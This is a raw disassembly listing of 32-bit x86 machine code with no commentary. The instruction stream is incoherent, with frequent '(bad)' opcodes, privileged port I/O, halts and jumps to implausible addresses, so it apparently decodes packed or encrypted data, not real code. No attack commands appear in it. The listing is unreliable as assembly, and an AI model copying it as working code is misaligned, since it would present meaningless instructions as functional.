  40505b:	mov    al,ds:0x4c42b97f
  405060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405062:	mov    es,edi
  405064:	retf   0x35fa
  405067:	sar    BYTE PTR [ebx-0x3],1
  40506a:	xchg   ecx,eax
  40506b:	addr16 std 
  40506d:	dec    esi
  40506e:	aad    0x1d
  405070:	pop    ecx
  405071:	adc    al,0xe3
  405073:	pop    edx
  405074:	jmp    0x6d865fad
  405079:	mov    cl,0x42
  40507b:	mov    BYTE PTR [edi+ebp*2],ch
  40507e:	push   ecx
  40507f:	add    dh,al
  405081:	add    al,0x8f
  405083:	lahf   
  405084:	pop    es
  405085:	arpl   WORD PTR [eax+0x7448a838],dx
  40508b:	out    dx,al
  40508c:	(bad)  
  40508d:	and    DWORD PTR [ecx-0x27],ecx
  405090:	out    0x1c,al
  405092:	xor    BYTE PTR [ebx],bh
  405094:	sub    bh,ah
  405096:	xor    ah,0x26
  405099:	jnp    0x4050f8
  40509b:	dec    ecx
  40509c:	cmp    DWORD PTR ds:0x540a1274,0x7f1a1ed3
  4050a6:	xchg   edi,eax
  4050a7:	sbb    esp,DWORD PTR [ebx-0x75]
  4050aa:	add    edi,ebp
  4050ac:	jp     0x40504a
  4050ae:	stos   DWORD PTR es:[edi],eax
  4050af:	pop    edx
  4050b0:	sub    eax,DWORD PTR [eax+0x7d]
  4050b3:	push   DWORD PTR [esi+esi*1+0x60]
  4050b7:	pop    ss
  4050b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050b9:	aaa    
  4050ba:	pusha  
  4050bb:	xchg   edx,edi
  4050bd:	daa    
  4050be:	dec    ecx
  4050bf:	jmp    0xa9648ec3
  4050c4:	repz sub edx,DWORD PTR [edi]
  4050c7:	add    eax,DWORD PTR [ecx+0xd]
  4050ca:	inc    ecx
  4050cb:	cli    
  4050cc:	call   0x1ffff0eb
  4050d1:	or     dl,BYTE PTR [ebp-0x5b]
  4050d4:	sub    al,bl
  4050d6:	xor    BYTE PTR [edi+ebp*1-0x42e1c57b],bl
  4050dd:	outs   dx,DWORD PTR ds:[esi]
  4050de:	jecxz  0x4050d5
  4050e0:	mov    dh,0xcf
  4050e2:	retf   0x816b
  4050e5:	mov    DWORD PTR ds:0xea72900d,esi
  4050eb:	imul   eax,DWORD PTR [esi+0x3670f1b8],0xffffffd9
  4050f2:	std    
  4050f3:	shr    DWORD PTR [edx+0x19],1
  4050f6:	imul   ebx,DWORD PTR [edi],0x885964ce
  4050fc:	repnz push esp
  4050fe:	(bad)  
  4050ff:	(bad)  
  405100:	test   eax,0xab694e29
  405105:	test   al,0x4b
  405107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405108:	ja     0x40515b
  40510a:	lock lods eax,DWORD PTR ds:[esi]
  40510c:	shl    edx,cl
  40510e:	hlt    
  40510f:	pop    eax
  405110:	jmp    0x42ec19a1
  405115:	rol    BYTE PTR [ebp+0xd],1
  405118:	adc    BYTE PTR ds:0x44e8eb19,0x34
  40511f:	dec    BYTE PTR [edi+0x6250fb07]
  405125:	adc    ecx,DWORD PTR [ebx+0x6e318507]
  40512b:	jmp    0x405136
  40512d:	dec    esp
  40512e:	sbb    eax,0x26b2b0ef
  405133:	and    al,0x77
  405135:	mov    esi,DWORD PTR [ebx]
  405137:	aad    0x6
  405139:	je     0x40519c
  40513b:	aad    0xdf
  40513d:	sub    eax,0xfc75f74d
  405142:	mov    al,0x63
  405144:	ds mov edx,0x455544c7
  40514a:	push   esp
  40514b:	and    edx,0xa
  40514e:	out    dx,al
  40514f:	cwde   
  405150:	in     al,dx
  405151:	stc    
  405152:	sahf   
  405153:	xlat   BYTE PTR ds:[ebx]
  405154:	pusha  
  405155:	push   esp
  405156:	leave  
  405157:	(bad)  
  405158:	pushf  
  405159:	push   ebx
  40515a:	je     0x405124
  40515c:	sbb    eax,ecx
  40515e:	sbb    al,0x76
  405160:	pop    ebx
  405161:	dec    ecx
  405162:	fisub  DWORD PTR [ebp-0x7e9ada0]
  405168:	or     ebp,esi
  40516a:	xchg   esp,eax
  40516b:	ja     0x4051ec
  40516d:	mov    al,ds:0x2b35d1b8
  405172:	xor    eax,0xa9d40d5a
  405177:	test   eax,0x1ba64c90
  40517c:	add    esp,DWORD PTR [edi+0x1c61e30f]
  405182:	cwde   
  405183:	sbb    ebp,DWORD PTR [edi]
  405185:	jbe    0x405126
  405187:	aam    0x62
  405189:	and    ch,ch
  40518b:	repnz cmp ch,BYTE PTR [ebp+eiz*1-0x5d02e335]
  405193:	mov    ah,0x4f
  405195:	(bad)  
  405196:	fsubr  DWORD PTR cs:[ebx+0x4e]
  40519a:	jl     0x405214
  40519c:	cmp    BYTE PTR [eax+0x1937a7c8],bh
  4051a2:	stos   BYTE PTR es:[edi],al
  4051a3:	out    0xa1,eax
  4051a5:	ja     0x4051f3
  4051a7:	mov    gs,WORD PTR [edx-0xc]
  4051aa:	jno    0x405134
  4051ac:	pcmpgtw mm0,QWORD PTR [edx]
  4051af:	ret    
  4051b0:	cmp    eax,DWORD PTR [edi]
  4051b2:	clc    
  4051b3:	jne    0x40519f
  4051b5:	jp     0x4051a3
  4051b7:	les    ebx,FWORD PTR [ebp-0x2a]
  4051ba:	lock gs pop edx
  4051bd:	jne    0x40515e
  4051bf:	jle    0x40516b
  4051c1:	loope  0x40515b
  4051c3:	mov    DWORD PTR [edx-0x319abc64],ecx
  4051c9:	ins    BYTE PTR es:[edi],dx
  4051ca:	dec    eax
  4051cb:	sub    DWORD PTR [esp+edi*2+0x5f],ebp
  4051cf:	rcr    bl,1
  4051d1:	pop    ebp
  4051d2:	pop    es
  4051d3:	cmp    al,0x67
  4051d5:	ins    BYTE PTR es:[edi],dx
  4051d6:	mov    bl,0xa5
  4051d8:	mov    BYTE PTR [ebx-0x10ff1995],0xe9
  4051df:	rcl    BYTE PTR [ebx-0x6a],cl
  4051e2:	ja     0x4051ec
  4051e4:	lea    ecx,[di-0x75]
  4051e8:	dec    esi
  4051e9:	arpl   cx,bp
  4051eb:	je     0x40520a
  4051ed:	add    edx,edi
  4051ef:	cld    
  4051f0:	test   eax,0x2ac434e8
  4051f5:	add    al,0x79
  4051f7:	(bad)  
  4051f8:	pop    edi
  4051f9:	mov    eax,ds:0xdb3d1a02
  4051fe:	pop    ss
  4051ff:	and    DWORD PTR [ebx+edx*2+0x19c28fcb],esi
  405206:	fmul   QWORD PTR [ecx]
  405208:	enter  0x68c,0xb0
  40520c:	jmp    FWORD PTR [ecx-0x4b817d64]
  405212:	mov    esi,?
  405214:	dec    esp
  405215:	bound  esi,QWORD PTR [esi-0xe]
  405218:	pop    es
  405219:	push   edx
  40521a:	aam    0x6e
  40521c:	lea    esi,[ebp-0x1ad1fb04]
  405222:	cmp    ebp,DWORD PTR [ecx+0x7d4bb9ec]
  405228:	pop    esi
  405229:	mov    ah,0x52
  40522b:	mov    edx,0x96b44a16
  405230:	mov    esi,0xd0a61ec0
  405235:	sbb    eax,0xf498ac74
  40523a:	gs push esi
  40523c:	ret    0x2ad6
  40523f:	leave  
  405240:	and    dh,cl
  405242:	iret   
  405243:	xchg   edx,eax
  405244:	inc    edx
  405245:	inc    ecx
  405246:	nop
  405247:	scas   eax,DWORD PTR es:[edi]
  405248:	or     dl,BYTE PTR [edi]
  40524a:	sub    al,0x31
  40524c:	mov    edi,0xb2e4de84
  405251:	mov    cl,0x63
  405253:	push   ebp
  405254:	cmp    al,0xa9
  405256:	popa   
  405257:	out    dx,eax
  405258:	cdq    
  405259:	xor    DWORD PTR [edi+eiz*2-0x18],0xa7bd6fb3
  405261:	lahf   
  405262:	inc    esp
  405263:	scas   eax,DWORD PTR es:[edi]
  405264:	push   eax
  405265:	inc    edi
  405266:	aam    0x15
  405268:	inc    ecx
  405269:	xor    DWORD PTR [ebp+0x72],0x49
  40526d:	and    BYTE PTR [ebp-0x2d],dh
  405270:	test   ah,bl
  405272:	inc    esp
  405273:	arpl   di,cx
  405275:	or     al,0x52
  405277:	arpl   bp,di
  405279:	or     eax,0x9d30988b
  40527e:	retf   
  40527f:	jnp    0x4052c5
  405281:	int3   
  405282:	pop    esi
  405283:	mov    DWORD PTR [esi+ecx*8+0x9],esp
  405287:	jae    0x4052e8
  405289:	xor    edi,edx
  40528b:	xchg   ebp,eax
  40528c:	aas    
  40528d:	daa    
  40528e:	imul   ebx,ecx,0xffffff92
  405291:	inc    edx
  405292:	xchg   ebp,eax
  405293:	jb     0x4052e7
  405295:	pushf  
  405296:	pop    edi
  405297:	inc    ebp
  405298:	xchg   ebp,eax
  405299:	inc    edx
  40529a:	push   ds
  40529b:	pop    ss
  40529c:	ret    0xb3
  40529f:	ins    DWORD PTR es:[edi],dx
  4052a0:	mov    ah,0xc5
  4052a2:	je     0x405285
  4052a4:	out    dx,al
  4052a5:	test   BYTE PTR [eax],bl
  4052a7:	add    BYTE PTR [ebp+0x7b],al
  4052aa:	iret   
  4052ab:	add    ecx,esi
  4052ad:	ss adc al,0x76
  4052b0:	sbb    bl,BYTE PTR [ebp-0x26]
  4052b3:	mov    ebp,ebx
  4052b5:	fist   DWORD PTR [ebx]
  4052b7:	cmp    eax,0x9d17623a
  4052bc:	mov    esp,DWORD PTR [ecx+0x44]
  4052bf:	ins    BYTE PTR es:[edi],dx
  4052c0:	addr16 pop ds
  4052c2:	(bad)  
  4052c3:	mov    edx,0x990645a5
  4052c8:	cmc    
  4052c9:	jp     0x405308
  4052cb:	jno    0x405263
  4052cd:	cmc    
  4052ce:	pop    ss
  4052cf:	jno    0x40528e
  4052d1:	scas   eax,DWORD PTR es:[edi]
  4052d2:	dec    ecx
  4052d3:	push   esi
  4052d4:	out    dx,eax
  4052d5:	cs lahf 
  4052d7:	and    eax,0x1a21bc80
  4052dc:	test   DWORD PTR [ecx],ebx
  4052de:	add    al,0x33
  4052e0:	mov    WORD PTR [esi+ecx*2],fs
  4052e3:	xchg   BYTE PTR [eax],al
  4052e5:	push   ss
  4052e6:	pop    ss
  4052e7:	imul   esp,ecx,0xe945d3f7
  4052ed:	rcl    DWORD PTR [esi-0x6ec0052],0x98
  4052f4:	jle    0x405343
  4052f6:	adc    al,0xac
  4052f8:	test   eax,0x773ec31d
  4052fd:	outs   dx,DWORD PTR ds:[esi]
  4052fe:	jne    0x40534b
  405300:	xchg   ebx,eax
  405301:	(bad)  
  405302:	push   ecx
  405303:	pop    ecx
  405304:	and    eax,DWORD PTR [ebp+0x50]
  405307:	xchg   ebp,eax
  405308:	inc    ecx
  405309:	bound  eax,QWORD PTR [ecx+0x6998599]
  40530f:	ins    DWORD PTR es:[edi],dx
  405310:	xlat   BYTE PTR ds:[ebx]
  405311:	cs aad 0x44
  405314:	scas   eax,DWORD PTR es:[edi]
  405315:	push   edx
  405316:	outs   dx,BYTE PTR ds:[esi]
  405317:	cmp    BYTE PTR [ebx+ebp*2+0x56ad9a5],al
  40531e:	popf   
  40531f:	repz addr16 das 
  405322:	out    dx,al
  405323:	lods   al,BYTE PTR ds:[esi]
  405324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405325:	cs retf 0xebd2
  405329:	sub    eax,0xf03575e5
  40532e:	cmp    ah,BYTE PTR [edx]
  405330:	mov    ?,ebp
  405332:	fst    QWORD PTR [edx+0x98661b0]
  405338:	std    
  405339:	inc    ebx
  40533a:	cld    
  40533b:	fld    TBYTE PTR [ebx-0x3c4c50a7]
  405341:	jecxz  0x4052c8
  405343:	fisub  WORD PTR [esi+0x43]
  405346:	scas   al,BYTE PTR es:[edi]
  405347:	cmp    al,0xef
  405349:	xchg   ecx,eax
  40534a:	(bad)  [esi-0x2de3cbb4]
  405350:	loop   0x405354
  405352:	push   ebx
  405353:	mov    ebp,0xd708bbcf
  405358:	inc    esi
  405359:	or     ah,BYTE PTR [edi]
  40535b:	mov    ebp,0xf4489942
  405360:	pop    ecx
  405361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405362:	sahf   
  405363:	jecxz  0x405373
  405365:	arpl   di,ax
  405367:	call   0xcd7f:0x459ecbcf
  40536e:	sub    cl,BYTE PTR [ebx+0x5e]
  405371:	pop    edi
  405372:	cwde   
  405373:	ficomp DWORD PTR [eax+0x494f148f]
  405379:	pusha  
  40537a:	int3   
  40537b:	xor    BYTE PTR [ecx],bl
  40537d:	(bad)  
  40537e:	sahf   
  40537f:	test   al,0xd4
  405381:	push   esi
  405382:	add    eax,0xe96e541c
  405387:	dec    esi
  405388:	dec    edx
  405389:	xchg   ebp,eax
  40538a:	fimul  DWORD PTR [ecx+0x6970e0b1]
  405390:	jmp    DWORD PTR [esi-0x6644a58e]
  405396:	cli    
  405397:	out    dx,eax
  405398:	cmp    BYTE PTR [edx+0x7d],0x42
  40539c:	push   ds
  40539d:	or     eax,0x6eb70e34
  4053a2:	mov    cx,0x316d
  4053a6:	xchg   ebx,eax
  4053a7:	(bad)  
  4053a8:	jg     0x40533d
  4053aa:	addr16 repz push cs
  4053ad:	test   DWORD PTR [edi-0x7db5c49c],eax
  4053b3:	push   edi
  4053b4:	mov    esp,0xdd91ca3d
  4053b9:	imul   edx,DWORD PTR [esi-0xa],0x8abc382d
  4053c0:	cdq    
  4053c1:	xchg   eax,ecx
  4053c3:	pop    edx
  4053c4:	out    0x77,eax
  4053c6:	xor    eax,DWORD PTR [eax+0x6a]
  4053c9:	in     al,0x94
  4053cb:	lods   al,BYTE PTR ds:[esi]
  4053cc:	jg     0x405363
  4053ce:	mov    bh,0x57
  4053d0:	mov    ecx,ebp
  4053d2:	ja     0x40540b
  4053d4:	push   ss
  4053d5:	popa   
  4053d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d7:	inc    DWORD PTR [edi+eiz*4]
  4053da:	inc    esp
  4053db:	or     edx,DWORD PTR [ecx+0x3ed42d0]
  4053e1:	ins    BYTE PTR es:[edi],dx
  4053e2:	mov    esp,0x8789d41b
  4053e7:	into   
  4053e8:	sbb    dh,cl
  4053ea:	jp     0x40541a
  4053ec:	xchg   ecx,eax
  4053ed:	add    ebp,ebp
  4053ef:	mov    BYTE PTR [ebx+ebx*2+0x32a6b182],0x35
  4053f7:	sub    bh,BYTE PTR [ebp+0x58]
  4053fa:	inc    ecx
  4053fb:	push   eax
  4053fc:	and    eax,0xdc08701f
  405401:	pop    edi
  405402:	dec    esp
  405403:	jmp    0x74c8:0xabbe50ba
  40540a:	mov    al,ds:0xbc4bf273
  40540f:	out    dx,eax
  405410:	fidiv  DWORD PTR [edx+esi*2]
  405413:	pop    ebp
  405414:	(bad)  
  405415:	sub    BYTE PTR [edx-0x64],cl
  405418:	daa    
  405419:	test   eax,0x6a0eb79d
  40541e:	(bad)  
  40541f:	mov    al,0xb6
  405421:	repz cmc 
  405423:	ret    0x2c16
  405426:	es ret 
  405428:	rol    BYTE PTR [edi],cl
  40542a:	in     eax,0x8c
  40542c:	lock inc eax
  40542e:	jp     0x40541f
  405430:	pushf  
  405431:	and    ecx,DWORD PTR [eax]
  405433:	fistp  DWORD PTR [edx+0x4bf21cd5]
  405439:	ror    DWORD PTR [di+0x4261],1
  40543e:	cmp    edi,DWORD PTR [ecx]
  405440:	xor    edx,DWORD PTR [ecx+0x49]
  405443:	push   ds
  405444:	and    eax,0x99bbbc8e
  405449:	mov    ebp,0xe3d14665
  40544e:	mov    al,0x8b
  405450:	dec    ebp
  405451:	adc    ah,0x58
  405454:	ss push edi
  405456:	retf   
  405457:	in     eax,dx
  405458:	or     ah,ah
  40545a:	scas   al,BYTE PTR es:[edi]
  40545b:	dec    esi
  40545c:	fidiv  DWORD PTR [ebx+0x28]
  40545f:	stos   DWORD PTR es:[edi],eax
  405460:	mov    ebp,0x6689db87
  405465:	lds    ecx,FWORD PTR [edi+eiz*1-0x63d2e4d1]
  40546c:	mov    al,ds:0x85f2d532
  405471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405472:	ja     0x4054b8
  405474:	das    
  405475:	mov    edx,0x3ceef49b
  40547a:	mov    bl,0xe4
  40547c:	mov    al,0xb4
  40547e:	and    al,0xe0
  405480:	mov    ds:0x23dca5d8,eax
  405485:	push   ecx
  405486:	pop    es
  405487:	jl     0x405427
  405489:	mov    esp,0xb58bd01
  40548e:	push   0x2e
  405490:	adc    eax,0xa322b5e
  405495:	add    al,0x1c
  405497:	imul   ebp,DWORD PTR ds:0x60f3b108,0x10
  40549e:	mov    ebx,0xf5f5564a
  4054a3:	jmp    0xa7ff:0x7a705b30
  4054aa:	jge    0x405462
  4054ac:	jle    0x4054ca
  4054ae:	rol    BYTE PTR [edi],1
  4054b0:	pop    ecx
  4054b1:	jmp    0xafa0:0xcdf548
  4054b8:	inc    esp
  4054b9:	scas   eax,DWORD PTR es:[edi]
  4054ba:	mov    eax,ds:0x19c1f47f
  4054bf:	retf   0x1df8
  4054c2:	popf   
  4054c3:	ja     0x4054ef
  4054c5:	xchg   ecx,eax
  4054c6:	popa   
  4054c7:	shr    esp,0xfa
  4054ca:	(bad)  
  4054cb:	fldenv [ecx+0x25c42280]
  4054d1:	dec    ebp
  4054d2:	aam    0x40
  4054d4:	add    al,0x89
  4054d6:	add    bh,bh
  4054d8:	mov    esi,eax
  4054da:	xor    cl,0x9
  4054dd:	and    edx,ebp
  4054df:	aad    0xbb
  4054e1:	fbld   TBYTE PTR [ebp+0x4e]
  4054e4:	ins    DWORD PTR es:[edi],dx
  4054e5:	push   ebp
  4054e6:	sub    al,0x79
  4054e8:	lods   eax,DWORD PTR ds:[esi]
  4054e9:	fs dec ecx
  4054eb:	mov    eax,ds:0x9429953a
  4054f0:	daa    
  4054f1:	(bad)  
  4054f2:	pop    ebx
  4054f3:	and    ah,BYTE PTR [edi]
  4054f5:	in     eax,dx
  4054f6:	cmc    
  4054f7:	or     eax,0xe5250854
  4054fc:	xchg   ecx,eax
  4054fd:	xchg   ebp,eax
  4054fe:	int    0xb0
  405500:	pop    edi
  405501:	ret    
  405502:	adc    eax,DWORD PTR [edi-0x60]
  405505:	loope  0x405508
  405507:	nop
  405508:	xchg   BYTE PTR [edx+0x2],bh
  40550b:	sub    BYTE PTR [eax],dl
  40550d:	push   cs
  40550e:	and    eax,DWORD PTR [ecx+0x751ada90]
  405514:	adc    bh,ch
  405516:	shl    DWORD PTR [edi],cl
  405518:	stos   BYTE PTR es:[edi],al
  405519:	jmp    0x405550
  40551b:	in     al,dx
  40551c:	inc    ebx
  40551d:	inc    eax
  40551e:	sub    esp,esi
  405520:	push   edx
  405521:	sub    ebx,DWORD PTR [edx+0x5155c90c]
  405527:	xchg   ecx,eax
  405528:	les    ecx,FWORD PTR [ebx-0xeb5e5e]
  40552e:	add    ebx,DWORD PTR [edx]
  405530:	cmp    al,0x21
  405532:	lods   al,BYTE PTR ds:[esi]
  405533:	or     ch,ch
  405535:	xchg   BYTE PTR [edx+0x618c6fc2],al
  40553b:	add    DWORD PTR [edx],0x9c44209
  405541:	ret    
  405542:	dec    edi
  405543:	dec    ecx
  405544:	pop    es
  405545:	cli    
  405546:	push   0xe
  405548:	mov    ch,0xaf
  40554a:	aam    0x51
  40554c:	out    dx,al
  40554d:	inc    edx
  40554e:	popf   
  40554f:	pushf  
  405550:	loopne 0x405529
  405552:	pop    es
  405553:	nop
  405554:	or     dh,BYTE PTR [edx+0x44300b52]
  40555a:	daa    
  40555b:	mov    al,0x9
  40555d:	dec    ebp
  40555e:	ret    0x9c56
  405561:	dec    esp
  405562:	mov    esp,0xa06e3164
  405567:	push   esi
  405568:	mov    bl,0xb4
  40556a:	pop    ebp
  40556b:	adc    BYTE PTR [ebx-0x19],0x49
  40556f:	add    DWORD PTR [ebx+edx*1-0x213d2590],eax
  405576:	shr    DWORD PTR [eax+0x4641e9dd],1
  40557c:	fcomp  DWORD PTR [esi-0x2764768c]
  405582:	xor    al,0x9b
  405584:	(bad)  [ecx+0x12e3c107]
  40558a:	hlt    
  40558b:	inc    ebx
  40558c:	jmp    0xe9d4:0xf64581f3
  405593:	cmp    dl,BYTE PTR [edx]
  405595:	in     al,0xb6
  405597:	hlt    
  405598:	out    dx,al
  405599:	ror    BYTE PTR [ebx-0x4],0x94
  40559d:	cmp    eax,DWORD PTR [edi-0x61]
  4055a0:	adc    BYTE PTR [eax-0x102b9778],ah
  4055a6:	sub    al,0x59
  4055a8:	add    eax,0xeaa30de8
  4055ad:	stc    
  4055ae:	push   ecx
  4055af:	jne    0x4055da
  4055b1:	shl    DWORD PTR [esi],cl
  4055b3:	ins    DWORD PTR es:[edi],dx
  4055b4:	xor    dh,bh
  4055b6:	ror    BYTE PTR [esi-0x12281d98],1
  4055bc:	inc    edx
  4055bd:	jecxz  0x4055c1
  4055bf:	jl     0x4055d3
  4055c1:	das    
  4055c2:	je     0x40562d
  4055c4:	add    al,0xe8
  4055c6:	fisttp WORD PTR [ecx]
  4055c8:	call   0x955c0688
  4055cd:	sub    BYTE PTR [ebx-0x43],cl
  4055d0:	pop    edi
  4055d1:	pop    edi
  4055d2:	mul    DWORD PTR ds:0x78b3e7c5
  4055d8:	cmp    BYTE PTR [edx],cl
  4055da:	(bad)  
  4055db:	dec    eax
  4055dc:	mov    edi,0xc926e321
  4055e1:	cmp    al,0x6c
  4055e3:	ror    BYTE PTR [esp+0x31b9acc5],cl
  4055ea:	test   BYTE PTR [edx],dh
  4055ec:	aaa    
  4055ed:	cmp    ch,al
  4055ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055f0:	iret   
  4055f1:	dec    ebx
  4055f2:	add    eax,esi
  4055f4:	push   ebx
  4055f5:	xchg   edx,eax
  4055f6:	sbb    BYTE PTR [ecx],ah
  4055f8:	out    dx,al
  4055f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055fa:	jmp    0x8d9305c8
  4055ff:	pop    ds
  405600:	mov    ds:0xd696d188,eax
  405605:	jo     0x405610
  405607:	rol    BYTE PTR [ebp-0x28b93dff],0x71
  40560e:	xchg   edx,eax
  40560f:	ja     0x40561e
  405611:	fcomp  QWORD PTR [edx+0x69bb5db4]
  405617:	lock mov bh,0xf8
  40561a:	inc    ebx
  40561b:	adc    bh,BYTE PTR [ecx+0x5a]
  40561e:	mov    esi,0x3067aecb
  405623:	ja     0x4056a0
  405625:	shl    DWORD PTR [edi-0x71],cl
  405628:	(bad)  
  405629:	stc    
  40562a:	sar    DWORD PTR [ecx],0xed
  40562d:	(bad)  
  40562e:	cmp    eax,0xe43152ec
  405633:	call   0xe66fb8ce
  405638:	loopne 0x405655
  40563a:	ss dec ecx
  40563c:	push   ebx
  40563d:	mov    ch,0x95
  40563f:	inc    eax
  405640:	and    al,0xaa
  405642:	pop    ds
  405643:	aaa    
  405644:	adc    ch,al
  405646:	dec    esp
  405647:	sbb    eax,DWORD PTR ds:0xb0de6e3a
  40564d:	add    eax,0x889c6cf9
  405652:	cld    
  405653:	add    ecx,esi
  405655:	clc    
  405656:	and    eax,0x50dee7b4
  40565b:	(bad)  
  40565c:	push   0x39
  40565e:	and    BYTE PTR [ebx+0x353432b],bh
  405664:	pop    eax
  405665:	jae    0x4055fb
  405667:	mov    bh,0x1e
  405669:	add    bh,ch
  40566b:	je     0x4056a2
  40566d:	fbld   TBYTE PTR [ebx+0x3a]
  405670:	addr16 mov al,0x1
  405673:	push   ds
  405674:	inc    esi
  405675:	push   cs
  405676:	pop    ebx
  405677:	enter  0x8d9,0x76
  40567b:	sbb    eax,0x785eef89
  405680:	rcl    BYTE PTR [ebp+0xc593972],cl
  405686:	push   esp
  405687:	xor    al,0x7a
  405689:	pop    edi
  40568a:	stc    
  40568b:	ins    DWORD PTR es:[edi],dx
  40568c:	jb     0x405683
  40568e:	stos   BYTE PTR es:[edi],al
  40568f:	and    DWORD PTR [esi+0x7abcbd8c],esi
  405695:	push   ebx
  405696:	mov    ah,0x4b
  405698:	les    esi,FWORD PTR [ecx]
  40569a:	mov    bh,0xe
  40569c:	mov    bh,0x63
  40569e:	sub    al,al
  4056a0:	sub    edi,DWORD PTR [esi-0x67e51b54]
  4056a6:	xchg   esi,eax
  4056a7:	sbb    DWORD PTR [edi-0x38],ebx
  4056aa:	(bad)  
  4056ab:	or     bl,BYTE PTR [eax+edx*4+0x5d1fc3f5]
  4056b2:	xor    al,0x29
  4056b4:	fdivr  QWORD PTR [edx+0x383da99d]
  4056ba:	scas   al,BYTE PTR es:[edi]
  4056bb:	adc    eax,0x558af28f
  4056c0:	xchg   ebp,eax
  4056c1:	mov    cl,0x7
  4056c3:	pop    ss
  4056c4:	dec    edx
  4056c5:	test   DWORD PTR [eax+ecx*4],0x66a81540
  4056cc:	add    eax,0x3bf62153
  4056d1:	rol    DWORD PTR [edx-0x2c],cl
  4056d4:	in     eax,0xa7
  4056d6:	cmp    ah,BYTE PTR [eax]
  4056d8:	das    
  4056d9:	fmul   DWORD PTR [eax+0x7f]
  4056dc:	inc    eax
  4056dd:	and    edx,0x1cb877fe
  4056e3:	dec    esp
  4056e4:	xchg   eax,esi
  4056e6:	lds    eax,FWORD PTR [ebx]
  4056e8:	mov    esp,esi
  4056ea:	jp     0x4056f6
  4056ec:	xchg   esp,eax
  4056ed:	scas   eax,DWORD PTR es:[edi]
  4056ee:	in     eax,0xf1
  4056f0:	pop    edi
  4056f1:	ins    BYTE PTR es:[edi],dx
  4056f2:	dec    ebx
  4056f3:	adc    DWORD PTR [ebp-0x45a77168],eax
  4056f9:	or     dl,0x9f
  4056fc:	inc    eax
  4056fd:	sbb    DWORD PTR ds:[ecx+0x39],esp
  405701:	push   ecx
  405702:	jbe    0x405743
  405704:	shl    DWORD PTR [eax-0x5426fb10],1
  40570a:	imul   edx,esp,0x92cb83ee
  405710:	sub    dl,ch
  405712:	repz mov eax,0xf3f7fc63
  405718:	mov    bl,0xbd
  40571a:	repz inc edx
  40571c:	int3   
  40571d:	push   ecx
  40571e:	lea    ebp,[edx+0x7ffdc02a]
  405724:	add    dh,BYTE PTR [edx+esi*8+0x4bded1ac]
  40572b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40572c:	add    al,0xa1
  40572e:	std    
  40572f:	fldenv ds:0xa973bd2e
  405735:	pusha  
  405736:	popf   
  405737:	ds das 
  405739:	ins    DWORD PTR es:[edi],dx
  40573a:	bound  eax,QWORD PTR [edi-0x1f3424b5]
  405740:	cmp    DWORD PTR [esi-0x6cf567e3],eax
  405746:	push   ebx
  405747:	add    bh,ch
  405749:	xchg   dl,al
  40574b:	dec    esi
  40574c:	mov    edi,0xe3eda639
  405751:	dec    edi
  405752:	adc    BYTE PTR [ebp-0x63],bh
  405755:	inc    edx
  405756:	std    
  405757:	enter  0x6b9a,0x3c
  40575b:	sbb    DWORD PTR [edi-0x637d4aad],eax
  405761:	fidivr DWORD PTR [edi-0x77144678]
  405767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405768:	cmp    DWORD PTR [eax+0x50fa61e9],ecx
  40576e:	cld    
  40576f:	dec    ecx
  405770:	rcr    DWORD PTR [edx-0x4d],0x2
  405774:	push   es
  405775:	or     edi,DWORD PTR [ecx-0x80]
  405778:	outs   dx,BYTE PTR ds:[esi]
  405779:	clc    
  40577a:	pop    es
  40577b:	inc    esp
  40577c:	xor    al,0x8b
  40577e:	int3   
  40577f:	xchg   DWORD PTR ds:0x76c5aada,ecx
  405785:	xor    al,0x1c
  405787:	in     eax,dx
  405788:	pop    ds
  405789:	outs   dx,BYTE PTR ds:[esi]
  40578a:	sbb    DWORD PTR [eax+esi*2-0x1],eax
  40578e:	ins    DWORD PTR es:[edi],dx
  40578f:	popa   
  405790:	push   edx
  405791:	repz cmp al,0x14
  405794:	mov    BYTE PTR [eax-0x4b0514f3],bl
  40579a:	ret    0x44c8
  40579d:	imul   esp,edi,0x42b46dc6
  4057a3:	ror    BYTE PTR [eax-0x50db6502],1
  4057a9:	mov    ecx,0xafeb4640
  4057ae:	fmul   QWORD PTR [edx-0x77]
  4057b1:	jle    0x40579d
  4057b3:	lock mov WORD PTR [di+0x72],es
  4057b8:	lahf   
  4057b9:	jae    0x405781
  4057bb:	mov    esi,0x938a2718
  4057c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c1:	ja     0x4057fd
  4057c3:	ins    BYTE PTR es:[edi],dx
  4057c4:	sbb    cl,dh
  4057c6:	in     al,0x9a
  4057c8:	push   cs
  4057c9:	ret    0xfd1a
  4057cc:	arpl   WORD PTR [ebp+0x25c9558b],ax
  4057d2:	pop    ebx
  4057d3:	sbb    DWORD PTR gs:[eax-0x49de24f0],ebx
  4057da:	dec    eax
  4057db:	mov    esi,0x4b5d6c4b
  4057e0:	jbe    0x40581d
  4057e2:	and    DWORD PTR [eax],ecx
  4057e4:	mov    WORD PTR [ebp+0x5274a7e8],?
  4057ea:	mov    es,WORD PTR [edi]
  4057ec:	mov    WORD PTR [edx],ds
  4057ee:	jae    0x40586a
  4057f0:	xor    ah,BYTE PTR [edx-0x662d3d2e]
  4057f6:	leave  
  4057f7:	lods   al,BYTE PTR ds:[esi]
  4057f8:	cwde   
  4057f9:	mul    DWORD PTR [edi+0x3]
  4057fc:	mov    bh,0x9c
  4057fe:	dec    esi
  4057ff:	xor    ebp,edx
  405801:	mov    ch,0xa5
  405803:	pop    ecx
  405804:	push   edi
  405805:	pushf  
  405806:	inc    esi
  405807:	xchg   esi,eax
  405808:	xchg   esi,eax
  405809:	fwait
  40580a:	xchg   DWORD PTR [edx-0x50b5957d],esi
  405810:	(bad)  
  405811:	call   0xab039e20
  405816:	bound  ebx,QWORD PTR [ecx+esi*1]
  405819:	out    0xd7,al
  40581b:	xchg   ebx,eax
